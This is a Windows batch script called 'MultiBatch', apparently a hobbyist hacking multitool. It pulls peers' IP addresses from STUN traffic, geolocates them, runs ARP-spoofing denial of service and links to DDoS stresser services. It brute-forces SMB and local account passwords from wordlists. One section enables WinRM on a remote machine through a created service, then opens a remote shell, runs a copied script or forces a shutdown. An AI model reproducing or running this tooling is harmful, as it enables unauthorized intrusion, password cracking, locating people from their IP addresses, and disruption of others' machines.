:: took me so lonnnnnng
:: pk tu lis le code
:: by 22ZEE

@echo off
cls
title MultiBatch - by 22ZEE
chcp 65001 >nul
color 5
:start
cls
call :banner

:menu
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
echo.
echo.
echo.
echo [38;2;0;255;80m                               (1)   Ip Puller(tshark) [0m                [38;2;0;255;80m (5)   UserBruteforce [0m
echo.
echo [38;2;0;180;160m                                (2)    IPTOOLKIT [0m                       [38;2;0;180;160m (6)   exit [0m
echo.
echo [38;2;0;100;230m                                  (3)     Bruteforce [0m  
echo.
echo [38;2;0;60;255m                                    (4)     PsExec   [0m  
echo.
echo.
echo.
set /p input=.%BS% [38;2;0;100;230m                       ^> [0m
if /I %input% EQU 1 call :puller
if /I %input% EQU 2 call :iptoolkit
if /I %input% EQU 3 call :Bruteforce
if /I %input% EQU 4 call :PsExec
if /I %input% EQU 5 call :UserBruteforce
if /I %input% EQU 6 call :Exit
if /I %input% EQU   call :Exit
cls
goto start

:banner
echo.
echo.
echo                      [38;2;0;255;80m ███╗   ███╗██╗   ██╗██╗  ████████╗██╗██████╗  █████╗ ████████╗ ██████╗██╗  ██╗ [0m
echo                      [38;2;0;220;120m ████╗ ████║██║   ██║██║  ╚══██╔══╝██║██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║  ██║ [0m
echo                      [38;2;0;180;160m ██╔████╔██║██║   ██║██║     ██║   ██║██████╔╝███████║   ██║   ██║     ███████║[0m
echo                      [38;2;0;140;200m ██║╚██╔╝██║██║   ██║██║     ██║   ██║██╔══██╗██╔══██║   ██║   ██║     ██╔══██║[0m 
echo                      [38;2;0;100;230m ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║██████╔╝██║  ██║   ██║   ╚██████╗██║  ██║[0m
echo                      [38;2;0;60;255m ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝[0m
echo.
goto :eof

:: IP PULLER

:puller
color A
cls
setlocal

for /f "usebackq delims=" %%i in (`powershell -NoProfile -Command "(Invoke-RestMethod -Uri https://api.ipify.org)"`) do (
    set "publicip=%%i"
)

if not defined publicip (
    echo Failed to retrieve public IP.
    pause
    goto :puller_end
)

set "tshark="

if exist "C:\Program Files\Wireshark\tshark.exe" (
    set "tshark=C:\Program Files\Wireshark\tshark.exe"
) else if exist "C:\Program Files (x86)\Wireshark\tshark.exe" (
    set "tshark=C:\Program Files (x86)\Wireshark\tshark.exe"
)

if not defined tshark (
    echo Wireshark not found.
    start https://www.wireshark.org/download.html
    pause
    goto :puller_end
)

echo tshark.exe Found! (%tshark%)
echo press 0 to go back
echo.
"%tshark%" -D
echo.

set /p "interface=Interface #: "

cls
echo.
echo IP Dump
echo -------
echo.

"%tshark%" -i "%interface%" -f "udp" -Y "stun.type == 0x0101 && stun.att.type == 0x0020 && stun.att.ipv4 != %publicip%" -T fields -e stun.att.ipv4

:puller_end
endlocal
goto :eof

:: IPTOOLKIT

:iptoolkit
color 3
cd files

:iptoolkit_menu
set ip=""
cls
echo.
type "banner.txt"
echo.
echo.
echo        PUBLIC IP
echo.
echo     (1) Geolocate
echo     (2) Trace DNS
echo     (3) Port Scan
echo     (4) DDOS
echo.
echo         LOCAL IP
echo.
echo     (4) Trace Mac Address
echo     (5) Port Scan
echo     (6) ARP Spoof (DOS)
echo     (7) RPC Dump
echo.
echo     (0) Back to Main Menu
echo.
set /p itinput=
if /I "%itinput%" EQU "1" goto :geolocate
if /I "%itinput%" EQU "2" goto :tracedns
if /I "%itinput%" EQU "3" goto :portscan
if /I "%itinput%" EQU "4" goto :Macaddr
if /I "%itinput%" EQU "5" goto :portscan
if /I "%itinput%" EQU "6" goto :arpspoof
if /I "%itinput%" EQU "7" goto :rpcdump
if /I "%itinput%" EQU "0" goto :iptoolkit_end
goto :iptoolkit_menu

:rpcdump
cls
echo.
set /p ip=Enter IP Address: 
rpcdump %ip%
echo.
pause
cls
goto :iptoolkit_menu

:Macaddr
cls
echo.
set /p ip=Enter IP Address: 
ping -w 1 %ip% >nul
for /f "tokens=2 delims= " %%a in ('arp -a ^| find "%ip%"') do set macaddr=%%a
for /f "usebackq delims=" %%I in (`powershell "\"%macaddr%\".toUpper()"`) do set "upper=%%~I"
cls
echo.
echo Mac Address: %upper%
echo.
pause
cls
goto :iptoolkit_menu

:arpspoof
cls
echo.
set errorlevel=0
set /p ip=Enter IP Address: 
start cmd /c "mode 87, 10 && title Spoofing %ip%... && echo. && arpspoof.exe %ip%"
goto :iptoolkit_menu

:ddos
cls
echo.
echo 1) https://freestresser.so/
echo 2) https://hardstresser.com/
echo 3) https://stresser.net/
echo 4) https://str3ssed.co/
echo 5) https://projectdeltastress.com/
echo 6) Back
echo.
set /p ddosinput=
if /I "%ddosinput%" EQU "1" start https://freestresser.so/
if /I "%ddosinput%" EQU "2" start https://hardstresser.com/
if /I "%ddosinput%" EQU "3" start https://stresser.net/
if /I "%ddosinput%" EQU "4" start https://str3ssed.co/
if /I "%ddosinput%" EQU "5" start https://projectdeltastress.com/
if /I "%ddosinput%" EQU "6" goto menu
goto menu

:portscan
cls
set errorlevel=0
echo.
set /p ip=IP Address: 
set /p ports=Ports (e.g. 21,22,23): 
start cmd /c "mode 40, 15 && title Scanning Ports... && PortScanner.exe hosts=%ip% ports=%ports%>>portscan.txt"
ping localhost -n 5 >nul
taskkill /im PortScanner.exe /f >nul 2>&1
echo.
type portscan.txt
echo.
ping localhost -n 1 >nul
del portscan.txt
pause
goto :iptoolkit_menu

:tracedns
cls
echo.
set /p ip=IP Address: 
cls
for /f "tokens=2 delims= " %%a in ('nslookup %ip% ^| find "Name"') do set dns=%%a
echo.
echo Domain Name: %dns%
echo.
pause
goto :iptoolkit_menu

:geolocate
cls
echo.
set /p ip=IP Address: 
cls
setlocal ENABLEDELAYEDEXPANSION
set webclient=webclient
if exist "%temp%\%webclient%.vbs" del "%temp%\%webclient%.vbs" /f /q /s >nul
if exist "%temp%\response.txt" del "%temp%\response.txt" /f /q /s >nul
echo sUrl = "http://ipinfo.io/%ip%/json" > %temp%\%webclient%.vbs
cls
echo set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> %temp%\%webclient%.vbs
echo oHTTP.open "GET", sUrl,false >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Length", Len(sRequest) >> %temp%\%webclient%.vbs
echo oHTTP.send sRequest >> %temp%\%webclient%.vbs
echo HTTPGET = oHTTP.responseText >> %temp%\%webclient%.vbs
echo strDirectory = "%temp%\response.txt" >> %temp%\%webclient%.vbs
echo set objFSO = CreateObject("Scripting.FileSystemObject") >> %temp%\%webclient%.vbs
echo set objFile = objFSO.CreateTextFile(strDirectory) >> %temp%\%webclient%.vbs
echo objFile.Write(HTTPGET) >> %temp%\%webclient%.vbs
echo objFile.Close >> %temp%\%webclient%.vbs
echo Wscript.Quit >> %temp%\%webclient%.vbs
start %temp%\%webclient%.vbs
set /a requests=0

:checkresponseexists
set /a requests=%requests% + 1
if %requests% gtr 7 goto :geo_failed
IF EXIST "%temp%\response.txt" (
    goto :response_exist
) ELSE (
    ping 127.0.0.1 -n 2 -w 1000 >nul
    goto :checkresponseexists
)

:geo_failed
taskkill /f /im wscript.exe >nul
del "%temp%\%webclient%.vbs" /f /q /s >nul
echo.
echo Did not receive a response from the API.
echo.
pause
endlocal
goto :iptoolkit_menu

:response_exist
cls
echo.
for /f "delims=     " %%i in ('findstr /i "," %temp%\response.txt') do (
    set data=%%i
    set data=!data:,=!
    set data=!data:""=Not Listed!
    set data=!data:"=!
    set data=!data:ip:=IP:      !
    set data=!data:hostname:=Hostname:  !
    set data=!data:org:=ISP:        !
    set data=!data:city:=City:      !
    set data=!data:region:=State:   !
    set data=!data:country:=Country:    !
    set data=!data:postal:=Postal:  !
    set data=!data:loc:=Location:   !
    set data=!data:timezone:=Timezone:  !
    echo !data!
)
echo.
del "%temp%\%webclient%.vbs" /f /q /s >nul
del "%temp%\response.txt" /f /q /s >nul
endlocal
if '%ip%'=='' goto :iptoolkit_menu
pause
goto :iptoolkit_menu

:iptoolkit_end
cd ..
color 5
goto :eof

:: Bruteforce 

:Bruteforce

cd files
color 9
cls
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
goto :eof

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
goto :eof

:: PsExec

:PsExec
cls
cd files >nul
color 0B
title PsExec
set success=[92m[+][0m
set warning=[91m[!][0m
set info=[94m[*][0m
set servicename=winrm%random%
:start2
cls
chcp 65001 >nul
call :banner2
echo.
echo  ╔════════════╗
echo  ║  Computer  ║
echo  ╚════════════╝
set /p domain=">> "
echo.
echo  ╔════════════╗
echo  ║  Username  ║
echo  ╚════════════╝
set /p user=">> "
echo.
echo  ╔════════════╗
echo  ║  Password  ║
echo  ╚════════════╝
set /p pass=">> "
echo.
echo %info% Connecting to %domain%...
net use \\%domain% /user:%user% %pass% >nul 2>&1
net use \\%domain% /user:%user% %pass% >nul 2>&1

if /I "%errorlevel%" NEQ "0" (
  echo %warning% Invalid Credentials or Network Issue
  pause
  goto :start2
)

echo %success% Connected!

:winrm
echo %info% Checking for WinRM...
chcp 437 >nul
powershell -Command "Test-WSMan -ComputerName %domain%" >nul 2>&1
set errorcode=%errorlevel%
chcp 65001 >nul

if /I "%errorcode%" NEQ "0" (
  echo %info% Creating Remote Service...
  sc \\%domain% create %servicename% binPath= "cmd.exe /c winrm quickconfig -force"
  echo %success% Configuring WinRM...
  sc \\%domain% start %servicename%
  echo %info% Deleting Service...
  sc \\%domain% delete %servicename%
  goto menu2
)

if /I "%errorcode%" EQU "0" (
  chcp 65001 >nul
  echo %success% %domain% has WinRM Enabled!
  timeout /t 3 >nul
  goto menu2
)

:menu2
cls
call :banner2
echo.
echo %info% Connected to %domain%
echo.
echo [95m[1][0m » Shell
echo [95m[2][0m » Files
echo [95m[3][0m » Information
echo [95m[4][0m » Shutdown
echo [95m[5][0m » Disconnect
echo.
set /p " =>> " <nul
choice /c 12345 >nul

if /I "%errorlevel%" EQU "1" (
  cls
  echo.
  echo %success% Opening Remote Shell...
  echo.
  winrs -r:%domain% -u:%user% -p:%pass% cmd
  goto menu2
)

if /I "%errorlevel%" EQU "2" (
  start "" "\\%domain%\C$"
  cls
  goto menu2
)

if /I "%errorlevel%" EQU "3" (
  cls
  echo.
  echo %info% Gathering Info..
  copy "info.bat" "\\%domain%\C$\ProgramData\info.bat" >nul
  winrs -r:%domain% -u:%user% -p:%pass% C:\ProgramData\info.bat
  pause
  del "\\%domain%\C$\ProgramData\info.bat"
  goto menu2
)

if /I "%errorlevel%" EQU "4" (
  winrs -r:%domain% -u:%user% -p:%pass% "shutdown /s /f /t 0"
  cls
  goto menu2
)

if /I "%errorlevel%" EQU "5" (
  net use \\%domain% /d /y >nul 2>&1
  goto start2
)

:banner2
echo.
echo.
echo [96m                                      ██████╗ ███████╗███████╗██╗  ██╗███████╗ ██████╗  [0m
echo [96m                                      ██╔══██╗██╔════╝██╔════╝╚██╗██╔╝██╔════╝██╔════╝  [0m
echo [96m                                      ██████╔╝███████╗█████╗   ╚███╔╝ █████╗  ██║       [0m
echo [96m                                      ██╔═══╝ ╚════██║██╔══╝   ██╔██╗ ██╔══╝  ██║       [0m
echo [96m                                      ██║     ███████║███████╗██╔╝ ██╗███████╗╚██████╗  [0m
echo [96m                                      ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝  [0m
echo.
echo.
goto :eof

:: UserBruteforce

:UserBruteforce
cls
echo make sure to enable wmic in win11
pause
cd Files
setlocal enabledelayedexpansion
color 1

:start3
cls
set error=-
color F
set user=""
set wordlist=""
echo.
echo      ___.                 __          _____                           
echo      \_ ^|_________ __ ___/  ^|_  _____/ ____\___________   ____  ____  
echo       ^| __ \_  __ \  ^|  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \ 
echo       ^| \_\ \  ^| \/  ^|  /^|  ^| \  ___/^|  ^| (  ^<_^> )  ^| \/\  \__\  ___/ 
echo       ^|___  /__^|  ^|____/ ^|__^|  \___  ^>__^|  \____/^|__^|    \___  ^>___  ^>
echo           \/                       \/                        \/    \/ 
echo.
echo    ╔════════════════════╗
echo    ║  COMMANDS:         ║
echo    ║                    ║
echo    ║  1. List Users     ║
echo    ║  2. Bruteforce     ║
echo    ║  3. Exit           ║
echo    ╚════════════════════╝

:input
set /p "=>> " <nul
choice /c 123 >nul

if /I "%errorlevel%" EQU "1" (
  echo.
  echo.
  wmic useraccount where "localaccount='true'" get name,sid,status
  goto input
)

if /I "%errorlevel%" EQU "2" (
  goto bruteforce2
)

if /I "%errorlevel%" EQU "3" (
  goto :eof
)

:bruteforce2
set /a count=1
echo.
echo.
echo [TARGET USER]
set /p user=">> "
echo.
echo [PASSWORD LIST]
set /p wordlist=">> "
if not exist "%wordlist%" echo. && echo [91m[%error%][0m [97mFile not found[0m && pause >nul && goto start
net user %user% >nul 2>&1
if /I "%errorlevel%" NEQ "0" (
  echo.
  echo [91m[%error%][0m [97mUser doesn't exist[0m
  pause >nul
  goto start3
)
net use \\127.0.0.1 /d /y >nul 2>&1
echo.
for /f "tokens=*" %%a in (%wordlist%) do (
  set pass=%%a
  call :varset
)
echo.
echo [91m[%error%][0m [97mPassword not found[0m
pause >nul
goto start3

:success2
echo.
echo [92m[+][0m [97mPassword found: %pass%[0m
net use \\127.0.0.1 /d /y >nul 2>&1
set user=
set pass=
echo.
pause >nul
goto start3

:varset
net use \\127.0.0.1 /user:%user% %pass% 2>&1 | find "System error 1331" >nul
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if /I "%errorlevel%" EQU "0" goto success2
net use | find "\\127.0.0.1" >nul
if /I "%errorlevel%" EQU "0" goto success2 

:: exit

:exit
exit